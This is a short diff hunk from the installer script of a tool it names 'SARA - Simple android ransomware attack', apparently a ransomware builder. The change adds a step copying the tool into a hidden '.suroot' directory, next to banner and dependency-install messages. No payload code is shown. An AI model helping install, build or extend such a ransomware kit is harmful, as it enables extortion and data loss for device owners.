@@ -26,7 +26,7 @@ exit
 fi
 }
 clear
-
+cp -R $DIR/SARA $DIR/.suroot/SARA
 echo -e $b">"$w" SARA - Simple android ransomware attack"
 echo -e $b">"$w" prepare for installing dependencies ..."
 sleep 3
